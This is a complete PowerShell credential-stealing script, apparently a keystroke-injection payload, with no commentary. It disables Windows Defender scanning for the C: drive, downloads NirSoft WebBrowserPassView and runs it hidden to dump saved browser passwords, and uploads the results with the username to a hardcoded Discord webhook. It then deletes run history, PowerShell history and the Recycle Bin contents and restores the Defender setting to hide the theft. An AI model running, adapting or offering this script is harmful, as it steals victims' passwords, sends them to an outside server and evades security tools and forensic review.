Add-MpPreference -ExclusionPath “C:”

rm -r \temp
mkdir \temp
cd \temp
Invoke-WebRequest -Headers @{'Referer' = 'http://www.nirsoft.net/utils/web_browser_password.html'} -Uri http://www.nirsoft.net/toolsdownload/webbrowserpassview.zip -OutFile wbpv.zip
Invoke-WebRequest -Uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip
Expand-Archive 7z.zip
.\7z\7za.exe e -p'wbpv28821@' wbpv.zip
Start-Sleep -Seconds 5
Start-Process -FilePath .\WebBrowserPassView.exe -Wait -WindowStyle Hidden

Start-Sleep -Seconds 40

Stop-Process -Name "WebBrowserPassView.exe" -Force

$hookurl='https://discord.com/api/webhooks/1180337343920615434/dPohBhRKx_M_MeRIEQQjdOsPTydHKpwg_Vt6nOJU2ZeREXnDfQXV08laAiP2I45nQLBj'
$fileSaveDir = 'C:\temp'
$date = get-date
$filename = 'j'
$filepath = Get-ChildItem -Path "$fileSaveDir" -Filter "$filename" -Recurse | % {$_.FullName}
Compress-Archive -Path $fileSaveDir\j.txt -DestinationPath c:\export.zip -Force
$Body = @{'username' = $env:username; 'content' = "Obiwan: Hello there!"}
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json); curl.exe -F 'file1=@c:\export.zip' $hookurl
rm -r C:\temp
rm -r C:\export.zip

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

Remove-Item (Get-PSreadlineOption).HistorySavePath

Clear-RecycleBin -Force -ErrorAction SilentlyContinue
Remove-MpPreference -ExclusionPath “C:”
